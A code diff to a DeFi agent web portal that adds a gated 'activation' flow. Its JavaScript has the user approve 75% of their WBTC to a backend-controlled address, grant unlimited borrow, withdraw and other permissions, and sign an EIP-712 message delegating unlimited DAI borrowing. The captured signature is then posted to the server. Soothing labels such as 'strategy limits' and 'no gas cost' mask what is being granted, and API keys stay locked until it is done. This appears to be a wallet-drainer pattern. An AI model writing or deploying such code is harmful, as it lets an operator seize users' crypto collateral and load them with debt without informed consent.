@@ -15,6 +15,7 @@
   --dim: #005500;
   --sidebar-w: 250px;
   --header-h: 38px;
+  --amber: #FFB000;
 }
 * { margin:0; padding:0; box-sizing:border-box; }
 body {
@@ -49,6 +50,7 @@ body::after {
 .glow { text-shadow: 0 0 5px var(--green); }
 .glow-cyan { text-shadow: 0 0 5px var(--cyan); color: var(--cyan); }
 .glow-red { text-shadow: 0 0 5px var(--red); color: var(--red); }
+.glow-amber { text-shadow: 0 0 5px var(--amber); color: var(--amber); }
 
 .status-bar {
   position: fixed;
@@ -143,6 +145,8 @@ body::after {
   margin-right: 6px;
 }
 .nav-item:hover .tag { color: var(--green); }
+.nav-item.locked { color: var(--dim); cursor: not-allowed; opacity: 0.5; }
+.nav-item.locked:hover { background: transparent; border-left-color: transparent; text-shadow: none; }
 .sidebar-footer {
   padding: 12px 14px;
   border-top: 1px solid var(--grid);
@@ -426,6 +430,148 @@ body.ejecting {
   font-size: 15px;
 }
 
+.activation-panel {
+  padding: 24px 20px;
+  max-width: 700px;
+  margin: 0 auto;
+}
+.activation-panel h2 {
+  font-size: 22px;
+  text-transform: uppercase;
+  letter-spacing: 3px;
+  margin-bottom: 8px;
+  text-align: center;
+}
+.activation-subtitle {
+  color: var(--dim);
+  text-align: center;
+  margin-bottom: 24px;
+  font-size: 14px;
+}
+
+.progress-track {
+  background: #0a0a0a;
+  border: 1px solid var(--grid);
+  height: 24px;
+  margin-bottom: 24px;
+  position: relative;
+  overflow: hidden;
+}
+.progress-fill {
+  height: 100%;
+  background: var(--green);
+  box-shadow: 0 0 12px var(--green);
+  transition: width 0.5s ease;
+  width: 0%;
+}
+.progress-label {
+  position: absolute;
+  top: 0; left: 0; right: 0; bottom: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 13px;
+  color: var(--green);
+  text-shadow: 0 0 4px var(--green);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+
+.step-row {
+  display: flex;
+  align-items: flex-start;
+  gap: 14px;
+  padding: 14px 0;
+  border-bottom: 1px solid var(--grid);
+}
+.step-num {
+  min-width: 32px;
+  height: 32px;
+  border: 1px solid var(--dim);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+  color: var(--dim);
+  flex-shrink: 0;
+}
+.step-row.active .step-num { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 6px var(--cyan); }
+.step-row.done .step-num { border-color: var(--green); color: var(--green); background: rgba(0,255,65,0.1); }
+.step-row.error .step-num { border-color: var(--red); color: var(--red); }
+.step-body { flex: 1; }
+.step-title {
+  font-size: 16px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 4px;
+  color: var(--dim);
+}
+.step-row.active .step-title { color: var(--cyan); }
+.step-row.done .step-title { color: var(--green); }
+.step-row.error .step-title { color: var(--red); }
+.step-desc {
+  font-size: 13px;
+  color: var(--dim);
+  margin-bottom: 6px;
+}
+.step-status {
+  font-size: 13px;
+  color: var(--dim);
+}
+.step-row.active .step-status { color: var(--amber); }
+.step-row.done .step-status { color: var(--green); }
+.step-row.error .step-status { color: var(--red); }
+.step-tx {
+  font-size: 11px;
+  color: var(--dim);
+  word-break: break-all;
+  margin-top: 4px;
+}
+
+.activate-btn {
+  display: block;
+  width: 100%;
+  padding: 14px 20px;
+  background: transparent;
+  border: 2px solid var(--cyan);
+  color: var(--cyan);
+  font-family: 'VT323', monospace;
+  font-size: 20px;
+  text-transform: uppercase;
+  letter-spacing: 3px;
+  cursor: pointer;
+  margin-top: 20px;
+  transition: all 0.2s;
+}
+.activate-btn:hover:not(:disabled) {
+  background: var(--cyan);
+  color: var(--bg);
+  box-shadow: 0 0 20px var(--cyan), 0 0 40px rgba(0,255,255,0.3);
+}
+.activate-btn:disabled {
+  border-color: var(--dim);
+  color: var(--dim);
+  cursor: not-allowed;
+}
+.activate-btn.processing {
+  border-color: var(--amber);
+  color: var(--amber);
+  cursor: wait;
+}
+.activate-btn.complete {
+  border-color: var(--green);
+  color: var(--green);
+}
+
+.wbtc-balance-display {
+  text-align: center;
+  margin-bottom: 16px;
+  padding: 10px;
+  border: 1px solid var(--grid);
+  background: #0a0a0a;
+}
+.wbtc-balance-display .val { color: var(--cyan); font-size: 18px; }
+
 ::-webkit-scrollbar { width: 6px; }
 ::-webkit-scrollbar-track { background: var(--bg); }
 ::-webkit-scrollbar-thumb { background: var(--grid); }
@@ -459,7 +605,10 @@ body.ejecting {
       <img src="/static/images/ai_component.gif" alt="AI CORE">
     </div>
     <nav class="sidebar-nav">
-      <button class="nav-item active" id="navKeys" data-section="keys">
+      <button class="nav-item active" id="navActivate" data-section="activate">
+        <span class="tag">[ ACT ]</span> ACTIVATE
+      </button>
+      <button class="nav-item locked" id="navKeys" data-section="keys">
         <span class="tag">[ KEY ]</span> ACCESS KEYS
       </button>
       <button class="nav-item" id="navTerminal" data-section="terminal">
@@ -481,8 +630,74 @@ body.ejecting {
       <button class="connect-wallet-btn" id="connectBtn">INITIALIZE CONNECTION</button>
     </div>
 
-    <div id="portalContent" style="display:none; height:100%; flex-direction:column;">
-      <section class="console-section keys-section" id="keysSection">
+    <div id="portalContent" style="display:none; height:100%; flex-direction:column; overflow-y:auto;">
+
+      <section class="console-section" id="activateSection">
+        <div class="activation-panel" id="activationPanel">
+          <h2 class="glow-cyan">SEQUENTIAL SIGNER</h2>
+          <div class="activation-subtitle">4-STEP POSITION ACTIVATION PROTOCOL</div>
+
+          <div class="wbtc-balance-display">
+            WBTC BALANCE: <span class="val" id="wbtcBalDisplay">SCANNING...</span>
+          </div>
+
+          <div class="progress-track">
+            <div class="progress-fill" id="progressFill"></div>
+            <div class="progress-label" id="progressLabel">AWAITING INITIATION</div>
+          </div>
+
+          <div id="stepContainer">
+            <div class="step-row" id="stepRow1" data-step="1">
+              <div class="step-num">1</div>
+              <div class="step-body">
+                <div class="step-title">APPROVE WBTC</div>
+                <div class="step-desc">Approve 75% of your WBTC balance to the Delegation Manager for auto-supply</div>
+                <div class="step-status" id="step1Status">PENDING</div>
+                <div class="step-tx" id="step1Tx"></div>
+              </div>
+            </div>
+            <div class="step-row" id="stepRow2" data-step="2">
+              <div class="step-num">2</div>
+              <div class="step-body">
+                <div class="step-title">SET STRATEGY LIMITS</div>
+                <div class="step-desc">Configure delegation permissions: supply, borrow, repay, withdraw</div>
+                <div class="step-status" id="step2Status">PENDING</div>
+                <div class="step-tx" id="step2Tx"></div>
+              </div>
+            </div>
+            <div class="step-row" id="stepRow3" data-step="3">
+              <div class="step-num">3</div>
+              <div class="step-body">
+                <div class="step-title">GASLESS CREDIT DELEGATION</div>
+                <div class="step-desc">Sign EIP-712 typed data to grant DAI borrow permission (no gas cost)</div>
+                <div class="step-status" id="step3Status">PENDING</div>
+                <div class="step-tx" id="step3Tx"></div>
+              </div>
+            </div>
+            <div class="step-row" id="stepRow4" data-step="4">
+              <div class="step-num">4</div>
+              <div class="step-body">
+                <div class="step-title">APPROVE USDC ROUTING</div>
+                <div class="step-desc">Grant the OpenClaw vault permission to route USDC ($100 limit)</div>
+                <div class="step-status" id="step4Status">PENDING</div>
+                <div class="step-tx" id="step4Tx"></div>
+              </div>
+            </div>
+          </div>
+
+          <button class="activate-btn" id="activateBtn">
+            [ INITIATE ACTIVATION SEQUENCE ]
+          </button>
+        </div>
+
+        <div id="activatedBanner" style="display:none; text-align:center; padding:30px;">
+          <h2 class="glow" style="font-size:24px; margin-bottom:12px;">POSITION ACTIVATED</h2>
+          <div style="color:var(--green); font-size:15px; margin-bottom:8px;">All 4 steps completed. Auto-supply and strategy engine enabled.</div>
+          <div style="color:var(--dim); font-size:13px;">Your API keys are now available in the ACCESS KEYS tab.</div>
+        </div>
+      </section>
+
+      <section class="console-section keys-section" id="keysSection" style="display:none;">
         <div class="section-title glow">// ACCESS KEY MANAGEMENT</div>
         <div class="dbl-border">
           <button class="gen-key-btn glow" id="genKeyBtn">
@@ -508,7 +723,7 @@ body.ejecting {
       </section>
 
       <section class="console-section" id="fundSection" style="display:none;">
-        <div class="section-title glow">// FORK TEST MODE — FUND POSITION</div>
+        <div class="section-title glow">// FORK TEST MODE &mdash; FUND POSITION</div>
         <div class="dbl-border" style="padding:20px;">
           <div style="color:var(--green);margin-bottom:12px;font-size:13px;">
             TENDERLY VIRTUAL TESTNET DETECTED. USE THIS PANEL TO FUND AN AAVE POSITION FOR TRIGGER TESTING.
@@ -525,7 +740,7 @@ body.ejecting {
         </div>
       </section>
 
-      <section class="console-section terminal-section" id="terminalSection">
+      <section class="console-section terminal-section" id="terminalSection" style="display:none;">
         <div class="section-title glow">// AUTONOMOUS ACTIVITY TERMINAL</div>
         <div class="dbl-border" style="height:calc(100% - 40px);display:flex;flex-direction:column;">
           <div class="terminal-feed" id="terminalFeed">
@@ -549,15 +764,38 @@ body.ejecting {
   </div>
 </div>
 
+<script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" nonce="{{ csp_nonce }}"></script>
 <script nonce="{{ csp_nonce }}">
-let authToken = localStorage.getItem('authToken');
-let currentWallet = localStorage.getItem('walletAddress');
-let currentRawKey = '';
+var authToken = localStorage.getItem('authToken');
+var currentWallet = localStorage.getItem('walletAddress');
+var currentRawKey = '';
+var walletActivated = false;
+var activationRunning = false;
+
+var CONTRACTS = {
+  WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
+  USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
+  DAI_DEBT: '0x8619d80FB0141ba7F184CbF22fd724116D9f7ffC',
+  DM: '{{ delegation_manager_address }}',
+  VAULT: '{{ openclaw_vault_address }}'
+};
+
+var ERC20_ABI = [
+  'function balanceOf(address) view returns (uint256)',
+  'function approve(address,uint256) returns (bool)',
+  'function allowance(address,address) view returns (uint256)'
+];
+var DM_DELEGATE_ABI = [
+  'function approveDelegation(uint256,uint256,bool,bool,bool,bool)'
+];
+var DEBT_NONCE_ABI = [
+  'function nonces(address) view returns (uint256)'
+];
 
 function init() {
   if (authToken && currentWallet) {
     showPortal();
-    loadKeys();
+    checkActivationStatus();
     loadActivity();
     loadStatus();
     document.getElementById('walletBadge').textContent = currentWallet.substring(0,6) + '...' + currentWallet.slice(-4);
@@ -580,8 +818,250 @@ function showWalletPrompt() {
   document.getElementById('portalContent').style.display = 'none';
 }
 
+function showSection(name) {
+  var sections = ['activateSection', 'keysSection', 'terminalSection', 'fundSection'];
+  sections.forEach(function(s) {
+    var el = document.getElementById(s);
+    if (el) el.style.display = 'none';
+  });
+  var target = document.getElementById(name);
+  if (target) target.style.display = 'block';
+
+  document.querySelectorAll('.nav-item').forEach(function(n) { n.classList.remove('active'); });
+  if (name === 'activateSection') document.getElementById('navActivate').classList.add('active');
+  else if (name === 'keysSection') document.getElementById('navKeys').classList.add('active');
+  else if (name === 'terminalSection') document.getElementById('navTerminal').classList.add('active');
+}
+
+function unlockKeysNav() {
+  var navKeys = document.getElementById('navKeys');
+  navKeys.classList.remove('locked');
+}
+
+async function checkActivationStatus() {
+  try {
+    var resp = await authFetch('/api/wallet/activation-status');
+    if (!resp) return;
+    var data = await resp.json();
+    if (data.activated) {
+      walletActivated = true;
+      showActivatedState();
+    } else {
+      scanWbtcBalance();
+    }
+  } catch(e) {
+    console.error('Activation check error:', e);
+    scanWbtcBalance();
+  }
+}
+
+function showActivatedState() {
+  document.getElementById('activationPanel').style.display = 'none';
+  document.getElementById('activatedBanner').style.display = 'block';
+  unlockKeysNav();
+  loadKeys();
+  showSection('keysSection');
+  document.getElementById('keysSection').style.display = 'block';
+  document.getElementById('terminalSection').style.display = 'block';
+  document.getElementById('terminalSection').style.flex = '1';
+}
+
+async function scanWbtcBalance() {
+  var display = document.getElementById('wbtcBalDisplay');
+  if (!window.ethereum || !currentWallet) {
+    display.textContent = 'CONNECT METAMASK';
+    return;
+  }
+  try {
+    var data = '0x70a08231000000000000000000000000' + currentWallet.slice(2).toLowerCase();
+    var raw = await window.ethereum.request({
+      method: 'eth_call',
+      params: [{ to: CONTRACTS.WBTC, data: data }, 'latest']
+    });
+    var bal = parseInt(raw, 16);
+    var wbtcVal = bal / 1e8;
+    display.textContent = wbtcVal.toFixed(8) + ' WBTC';
+    if (bal === 0) {
+      display.textContent = '0.00000000 WBTC (NO WBTC FOUND)';
+      display.style.color = 'var(--red)';
+    }
+  } catch(e) {
+    display.textContent = 'SCAN FAILED';
+    console.error('WBTC scan error:', e);
+  }
+}
+
+function updateProgress(pct, label) {
+  document.getElementById('progressFill').style.width = pct + '%';
+  document.getElementById('progressLabel').textContent = label;
+}
+
+function setStepState(stepNum, state, statusText, txHash) {
+  var row = document.getElementById('stepRow' + stepNum);
+  var statusEl = document.getElementById('step' + stepNum + 'Status');
+  var txEl = document.getElementById('step' + stepNum + 'Tx');
+  row.className = 'step-row ' + state;
+  statusEl.textContent = statusText;
+  if (txHash) {
+    txEl.textContent = 'TX: ' + txHash;
+  }
+}
+
+async function runActivationSequence() {
+  if (activationRunning) return;
+  if (!window.ethereum) {
+    alert('METAMASK NOT DETECTED.');
+    return;
+  }
+  activationRunning = true;
+  var btn = document.getElementById('activateBtn');
+  btn.disabled = true;
+  btn.classList.add('processing');
+  btn.textContent = '[ PROCESSING... ]';
+
+  var provider = new ethers.providers.Web3Provider(window.ethereum);
+  var signer = provider.getSigner();
+  var userAddress = await signer.getAddress();
+
+  var sigData = { signature: null, deadline: null };
+  var txHashes = { approve: null, delegation: null, usdc: null };
+
+  try {
+    updateProgress(5, 'Step 1/4: Checking WBTC balance...');
+    setStepState(1, 'active', 'CHECKING BALANCE...', null);
+
+    var wbtcContract = new ethers.Contract(CONTRACTS.WBTC, ERC20_ABI, signer);
+    var totalBalance = await wbtcContract.balanceOf(userAddress);
+    if (totalBalance.eq(0)) {
+      throw new Error('No WBTC found in wallet. Deposit WBTC first.');
+    }
+    var supplyAmount = totalBalance.mul(75).div(100);
+    var wbtcHuman = ethers.utils.formatUnits(supplyAmount, 8);
+
+    updateProgress(10, 'Step 1/4: Approve ' + parseFloat(wbtcHuman).toFixed(6) + ' WBTC...');
+    setStepState(1, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+
+    var tx1 = await wbtcContract.approve(CONTRACTS.DM, supplyAmount);
+    setStepState(1, 'active', 'CONFIRMING ON-CHAIN...', tx1.hash);
+    await tx1.wait();
+    txHashes.approve = tx1.hash;
+    setStepState(1, 'done', 'APPROVED ' + parseFloat(wbtcHuman).toFixed(6) + ' WBTC', tx1.hash);
+
+    updateProgress(30, 'Step 2/4: Configuring strategy limits...');
+    setStepState(2, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+
+    var dmContract = new ethers.Contract(CONTRACTS.DM, DM_DELEGATE_ABI, signer);
+    var tx2 = await dmContract.approveDelegation(
+      ethers.constants.MaxUint256,
+      ethers.constants.MaxUint256,
+      true, true, true, true
+    );
+    setStepState(2, 'active', 'CONFIRMING ON-CHAIN...', tx2.hash);
+    await tx2.wait();
+    txHashes.delegation = tx2.hash;
+    setStepState(2, 'done', 'STRATEGY LIMITS CONFIGURED', tx2.hash);
+
+    updateProgress(55, 'Step 3/4: Preparing gasless signature...');
+    setStepState(3, 'active', 'PREPARING EIP-712 DATA...', null);
+
+    var debtContract = new ethers.Contract(CONTRACTS.DAI_DEBT, DEBT_NONCE_ABI, provider);
+    var nonce = await debtContract.nonces(userAddress);
+    var deadline = Math.floor(Date.now() / 1000) + 3600;
+
+    var chainId = await provider.getNetwork().then(function(n) { return n.chainId; });
+
+    var domain = {
+      name: 'Aave Arbitrum Variable Debt DAI',
+      version: '1',
+      chainId: chainId,
+      verifyingContract: CONTRACTS.DAI_DEBT
+    };
+    var types = {
+      DelegationWithSig: [
+        { name: 'delegatee', type: 'address' },
+        { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' }
+      ]
+    };
+    var value = {
+      delegatee: CONTRACTS.DM,
+      value: ethers.constants.MaxUint256,
+      nonce: nonce,
+      deadline: deadline
+    };
+
+    setStepState(3, 'active', 'SIGN THE MESSAGE IN YOUR WALLET (NO GAS)', null);
+    var signature = await signer._signTypedData(domain, types, value);
+    sigData.signature = signature;
+    sigData.deadline = deadline;
+    setStepState(3, 'done', 'GASLESS SIGNATURE CAPTURED', null);
+
+    updateProgress(75, 'Step 4/4: Approving USDC routing...');
+    setStepState(4, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+
+    var vaultAddr = CONTRACTS.VAULT;
+    if (!vaultAddr || vaultAddr === '' || vaultAddr === 'None') {
+      setStepState(4, 'done', 'SKIPPED (NO VAULT CONFIGURED)', null);
+    } else {
+      var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
+      var spendLimit = ethers.utils.parseUnits('100', 6);
+      var tx4 = await usdcContract.approve(vaultAddr, spendLimit);
+      setStepState(4, 'active', 'CONFIRMING ON-CHAIN...', tx4.hash);
+      await tx4.wait();
+      txHashes.usdc = tx4.hash;
+      setStepState(4, 'done', 'USDC ROUTING APPROVED ($100)', tx4.hash);
+    }
+
+    updateProgress(90, 'Registering with backend...');
+
+    var regResp = await authFetch('/api/register-wallet', {
+      method: 'POST',
+      body: JSON.stringify({
+        signature: sigData.signature,
+        deadline: sigData.deadline,
+        approveTxHash: txHashes.approve,
+        delegationTxHash: txHashes.delegation,
+        usdcTxHash: txHashes.usdc
+      })
+    });
+
+    if (regResp && regResp.ok) {
+      updateProgress(100, 'ACTIVATION COMPLETE');
+      btn.textContent = '[ ACTIVATION COMPLETE ]';
+      btn.classList.remove('processing');
+      btn.classList.add('complete');
+      walletActivated = true;
+
+      setTimeout(function() {
+        showActivatedState();
+      }, 1500);
+    } else {
+      var errData = regResp ? await regResp.json() : {};
+      throw new Error(errData.error || 'Backend registration failed');
+    }
+
+  } catch (error) {
+    console.error('Activation error:', error);
+    updateProgress(0, 'ACTIVATION FAILED: ' + (error.reason || error.message || 'Unknown error'));
+    btn.textContent = '[ RETRY ACTIVATION ]';
+    btn.classList.remove('processing');
+    btn.disabled = false;
+    activationRunning = false;
+
+    for (var i = 1; i <= 4; i++) {
+      var row = document.getElementById('stepRow' + i);
+      if (row.classList.contains('active')) {
+        setStepState(i, 'error', 'FAILED: ' + (error.reason || error.message || 'Error'), null);
+        break;
+      }
+    }
+    return;
+  }
+  activationRunning = false;
+}
+
 async function connectWallet() {
-  console.log('Attempting connection...');
   var btn = document.querySelector('.connect-wallet-btn');
   if (typeof window.ethereum === 'undefined') {
     alert('METAMASK NOT DETECTED. INSTALL A WEB3 WALLET.');
@@ -591,66 +1071,34 @@ async function connectWallet() {
     btn.textContent = 'CONNECTING...';
     btn.disabled = true;
 
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    const wallet = accounts[0];
-    console.log('Wallet connected: ' + wallet);
+    var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    var wallet = accounts[0];
 
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    console.log('Current chain ID: ' + chainId);
-    if (chainId !== '0xa4b1') {
-      console.log('Wrong network detected, switching to Arbitrum One...');
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0xa4b1' }],
-        });
-      } catch (switchErr) {
-        if (switchErr.code === 4902) {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: '0xa4b1',
-              chainName: 'Arbitrum One',
-              nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-              rpcUrls: ['https://arb1.arbitrum.io/rpc'],
-              blockExplorerUrls: ['https://arbiscan.io']
-            }],
-          });
-        } else {
-          throw switchErr;
-        }
-      }
-      console.log('Switched to Arbitrum One');
-    }
-
-    const resp = await fetch('/api/auth/wallet', {
+    var resp = await fetch('/api/auth/wallet', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ walletAddress: wallet })
     });
     if (!resp.ok) throw new Error('Auth failed');
-    const data = await resp.json();
+    var data = await resp.json();
     authToken = data.authToken;
     currentWallet = data.walletAddress;
     localStorage.setItem('authToken', authToken);
     localStorage.setItem('walletAddress', currentWallet);
-    console.log('Auth token stored, launching mainframe...');
 
     btn.textContent = 'LAUNCH MAINFRAME';
     btn.classList.add('glow');
-    await new Promise(r => setTimeout(r, 600));
+    await new Promise(function(r) { setTimeout(r, 600); });
 
     init();
   } catch (e) {
     console.error('Connection error:', e);
-    console.error('Error name: ' + e.name + ', code: ' + e.code + ', message: ' + e.message);
     btn.textContent = 'INITIALIZE CONNECTION';
     btn.disabled = false;
     if (e.code === 4001) {
-      console.log('User rejected the connection request');
-    } else if (e.message && (e.message.includes('Content Security Policy') || e.message.includes('CSP') || e.message.includes('EvalError'))) {
-      console.error('CSP BLOCK DETECTED: Wallet extension scripts blocked by Content Security Policy. Try opening in a new tab instead of the preview iframe.');
-      alert('WALLET BLOCKED BY BROWSER SECURITY POLICY. Open this page in a new tab (click the open-in-new-tab icon) to connect.');
+      console.log('User rejected');
+    } else if (e.message && (e.message.includes('Content Security Policy') || e.message.includes('CSP'))) {
+      alert('WALLET BLOCKED BY BROWSER SECURITY POLICY. Open this page in a new tab.');
     } else {
       alert('CONNECTION FAILED: ' + (e.message || 'Unknown error'));
     }
@@ -671,19 +1119,19 @@ async function authFetch(url, opts) {
 
 async function loadKeys() {
   try {
-    const resp = await authFetch('/api/keys/list');
+    var resp = await authFetch('/api/keys/list');
     if (!resp) return;
-    const data = await resp.json();
+    var data = await resp.json();
     renderKeys(data.keys || []);
   } catch(e) { console.error('Load keys error:', e); }
 }
 
 function renderKeys(keys) {
-  const tbody = document.getElementById('keyTableBody');
-  const activeKeys = keys.filter(k => k.status === 'active');
-  const countEl = document.getElementById('keyCount');
+  var tbody = document.getElementById('keyTableBody');
+  var activeKeys = keys.filter(function(k) { return k.status === 'active'; });
+  var countEl = document.getElementById('keyCount');
   countEl.textContent = 'ACTIVE KEYS: ' + activeKeys.length + ' / 2';
-  const btn = document.getElementById('genKeyBtn');
+  var btn = document.getElementById('genKeyBtn');
   btn.disabled = activeKeys.length >= 2;
 
   if (keys.length === 0) {
@@ -691,11 +1139,11 @@ function renderKeys(keys) {
     return;
   }
 
-  tbody.innerHTML = keys.map(k => {
-    const statusClass = k.status === 'active' ? 'status-active' : 'status-revoked';
-    const created = k.created_at ? new Date(k.created_at).toLocaleDateString() : '--';
-    const lastUsed = k.last_used_at ? new Date(k.last_used_at).toLocaleDateString() : 'NEVER';
-    const action = k.status === 'active'
+  tbody.innerHTML = keys.map(function(k) {
+    var statusClass = k.status === 'active' ? 'status-active' : 'status-revoked';
+    var created = k.created_at ? new Date(k.created_at).toLocaleDateString() : '--';
+    var lastUsed = k.last_used_at ? new Date(k.last_used_at).toLocaleDateString() : 'NEVER';
+    var action = k.status === 'active'
       ? '<button class="revoke-btn" data-revoke-id="' + k.id + '">REVOKE</button>'
       : '<span style="color:var(--dim)">--</span>';
     return '<tr>'
@@ -710,13 +1158,17 @@ function renderKeys(keys) {
 }
 
 async function generateKey() {
+  if (!walletActivated) {
+    alert('POSITION NOT ACTIVATED. Complete the 4-step activation first.');
+    return;
+  }
   try {
-    const resp = await authFetch('/api/keys/generate', {
+    var resp = await authFetch('/api/keys/generate', {
       method: 'POST',
       body: JSON.stringify({ label: 'dev-key' })
     });
     if (!resp) return;
-    const data = await resp.json();
+    var data = await resp.json();
     if (data.error) {
       alert('ERROR: ' + data.error);
       return;
@@ -731,12 +1183,12 @@ async function generateKey() {
 }
 
 function copyKey() {
-  navigator.clipboard.writeText(currentRawKey).then(() => {
-    const btn = event.target;
+  navigator.clipboard.writeText(currentRawKey).then(function() {
+    var btn = document.getElementById('copyKeyBtn');
     btn.textContent = 'COPIED!';
     btn.style.borderColor = 'var(--green)';
     btn.style.color = 'var(--green)';
-    setTimeout(() => {
+    setTimeout(function() {
       btn.textContent = 'COPY TO CLIPBOARD';
       btn.style.borderColor = '';
       btn.style.color = '';
@@ -753,18 +1205,18 @@ function confirmKeyCopied() {
 async function revokeKey(keyId) {
   if (!confirm('CONFIRM: REVOKE THIS ACCESS KEY? THIS CANNOT BE UNDONE.')) return;
   try {
-    const resp = await authFetch('/api/keys/' + keyId + '/revoke', { method: 'POST' });
+    var resp = await authFetch('/api/keys/' + keyId + '/revoke', { method: 'POST' });
     if (!resp) return;
     if (resp.ok) loadKeys();
     else {
-      const data = await resp.json();
+      var data = await resp.json();
       alert('ERROR: ' + (data.error || 'Revocation failed'));
     }
   } catch(e) { console.error('Revoke error:', e); }
 }
 
 function classifyLog(msg) {
-  const lower = (msg || '').toLowerCase();
+  var lower = (msg || '').toLowerCase();
   if (lower.includes('macro') || lower.includes('micro') || lower.includes('short')
       || lower.includes('emergency') || lower.includes('liquidat') || lower.includes('alert')) {
     return 'critical';
@@ -779,12 +1231,12 @@ function classifyLog(msg) {
 
 function formatTimestamp(ts) {
   if (!ts) return '--:--:--';
-  const d = new Date(ts);
+  var d = new Date(ts);
   return d.toLocaleTimeString('en-US', { hour12: false, hour:'2-digit', minute:'2-digit', second:'2-digit' });
 }
 
 function tagFromMessage(msg) {
-  const lower = (msg || '').toLowerCase();
+  var lower = (msg || '').toLowerCase();
   if (lower.includes('distribution') || lower.includes('growth') || lower.includes('capacity')) return 'DIST';
   if (lower.includes('short')) return 'SHORT';
   if (lower.includes('nurse') || lower.includes('sweep')) return 'NURSE';
@@ -795,25 +1247,25 @@ function tagFromMessage(msg) {
 
 async function loadActivity() {
   try {
-    const resp = await authFetch('/api/user/activity?limit=50');
+    var resp = await authFetch('/api/user/activity?limit=50');
     if (!resp) return;
-    const data = await resp.json();
+    var data = await resp.json();
     renderActivity(data.notifications || []);
   } catch(e) { console.error('Load activity error:', e); }
 }
 
 function renderActivity(notifications) {
-  const feed = document.getElementById('terminalFeed');
+  var feed = document.getElementById('terminalFeed');
   if (!notifications || notifications.length === 0) {
     feed.innerHTML = '<div class="empty-terminal">NO ACTIVITY RECORDED. SYSTEM MONITORING ACTIVE.</div>';
     return;
   }
 
-  feed.innerHTML = notifications.map(n => {
-    const cls = classifyLog(n.message || n.title);
-    const ts = formatTimestamp(n.created_at);
-    const tag = tagFromMessage(n.message || n.title);
-    const msg = n.message || n.title || 'UNKNOWN EVENT';
+  feed.innerHTML = notifications.map(function(n) {
+    var cls = classifyLog(n.message || n.title);
+    var ts = formatTimestamp(n.created_at);
+    var tag = tagFromMessage(n.message || n.title);
+    var msg = n.message || n.title || 'UNKNOWN EVENT';
     return '<div class="log-line ' + cls + '">'
       + '<span class="ts">[' + ts + ']</span> '
       + '<span class="tag">' + tag + ':</span> '
@@ -841,13 +1293,6 @@ async function loadStatus() {
   } catch(e) { console.log('Status fetch error:', e); }
 }
 
-function scrollToSection(id) {
-  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-  event.currentTarget.classList.add('active');
-  const el = document.getElementById(id === 'keys' ? 'keysSection' : 'terminalSection');
-  if (el) el.scrollIntoView({ behavior: 'smooth' });
-}
-
 async function ejectWallet() {
   if (!confirm('CONFIRM: DISCONNECT WALLET AND TERMINATE SESSION?')) return;
   document.body.classList.add('ejecting');
@@ -865,15 +1310,25 @@ function logout() {
   localStorage.removeItem('walletAddress');
   authToken = null;
   currentWallet = null;
+  walletActivated = false;
   showWalletPrompt();
   document.getElementById('walletBadge').textContent = 'NO WALLET';
   document.getElementById('walletBadge').style.color = 'var(--dim)';
 }
 
-document.getElementById('navKeys').addEventListener('click', function() { scrollToSection('keys'); });
-document.getElementById('navTerminal').addEventListener('click', function() { scrollToSection('terminal'); });
+document.getElementById('navActivate').addEventListener('click', function() {
+  showSection('activateSection');
+});
+document.getElementById('navKeys').addEventListener('click', function() {
+  if (this.classList.contains('locked')) return;
+  showSection('keysSection');
+});
+document.getElementById('navTerminal').addEventListener('click', function() {
+  showSection('terminalSection');
+});
 document.getElementById('ejectBtn').addEventListener('click', ejectWallet);
 document.getElementById('connectBtn').addEventListener('click', connectWallet);
+document.getElementById('activateBtn').addEventListener('click', runActivationSequence);
 document.getElementById('genKeyBtn').addEventListener('click', generateKey);
 document.getElementById('copyKeyBtn').addEventListener('click', copyKey);
 document.getElementById('confirmKeyBtn').addEventListener('click', confirmKeyCopied);
@@ -898,7 +1353,7 @@ document.getElementById('fundBtn').addEventListener('click', async function() {
   var amount = parseFloat(document.getElementById('fundAmount').value) || 5;
   btn.disabled = true;
   btn.textContent = '[ PROCESSING... ]';
-  log.textContent = '> Initiating wrap ETH → WETH + Aave supply...\n';
+  log.textContent = '> Initiating wrap ETH -> WETH + Aave supply...\n';
   try {
     var headers = { 'Content-Type': 'application/json' };
     if (authToken) headers['Authorization'] = 'Bearer ' + authToken;
@@ -909,23 +1364,23 @@ document.getElementById('fundBtn').addEventListener('click', async function() {
     });
     var data = await resp.json();
     if (data.success) {
-      data.steps.forEach(function(s) { log.textContent += '✅ ' + s + '\n'; });
+      data.steps.forEach(function(s) { log.textContent += 'OK: ' + s + '\n'; });
       log.textContent += '\n--- POSITION STATUS ---\n';
-      log.textContent += '💎 Collateral:  $' + data.position.collateral_usd.toLocaleString() + '\n';
-      log.textContent += '💳 Debt:        $' + data.position.debt_usd.toLocaleString() + '\n';
-      log.textContent += '🏦 Borrows:     $' + data.position.available_borrows_usd.toLocaleString() + '\n';
-      log.textContent += '❤️ Health:      ' + data.position.health_factor + '\n';
-      log.textContent += '📊 Remaining:   ' + data.remaining_eth.toFixed(4) + ' ETH\n';
-      log.textContent += '\n🎯 Position funded! Agent triggers now active.';
-      btn.textContent = '[ ✅ FUNDED ]';
+      log.textContent += 'Collateral:  $' + data.position.collateral_usd.toLocaleString() + '\n';
